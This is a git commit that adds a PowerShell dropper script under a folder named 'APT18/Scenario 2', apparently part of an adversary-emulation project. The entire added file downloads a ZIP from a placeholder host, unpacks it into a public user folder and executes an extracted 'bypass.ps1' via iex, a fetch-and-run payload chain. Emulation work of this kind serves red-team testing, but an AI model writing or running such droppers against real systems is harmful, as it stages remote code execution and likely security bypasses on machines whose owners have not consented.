dfdae00f5b142fc9428fede160f23ecdcf978838
Alekzandr <kyle.topasna@gmail.com>
2023-12-17 09:30:35 -0900

    99% payload

---
+++ APT18/Scenario 2/dropper.ps1
@@ -0,0 +1,19 @@
+# Define the URL of the ZIP file and the local path to save it
+$url = "http://example.com/path/to/your/file.zip"
+$zipPath = "C:\Users\Public\payloads.zip"
+
+# Download the ZIP file
+Invoke-WebRequest -Uri $url -OutFile $zipPath
+
+# Define the extraction path
+$extractPath = "C:\Users\Public\payloads"
+
+# Extract the ZIP file
+Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath
+
+# Define the path of the PowerShell script inside the extracted folder
+# Update the script name as per your ZIP content
+$scriptPath = Join-Path $extractPath "bypass.ps1"
+
+# Execute the PowerShell script
+iex $scriptPath
